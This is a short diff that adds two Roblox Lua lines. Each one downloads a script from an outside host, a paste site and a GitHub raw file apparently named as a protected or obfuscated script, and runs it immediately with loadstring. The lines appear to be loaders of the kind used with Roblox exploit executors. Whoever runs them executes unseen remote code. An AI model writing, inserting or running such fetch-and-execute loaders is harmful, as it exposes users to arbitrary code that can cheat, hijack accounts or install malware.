@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/F9F9NxVAKOm5OyiC/raw"))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/collectorhenfi-wq/Hendarr/refs/heads/main/Protected_1203131870047322.lua%20(2).txt"))()
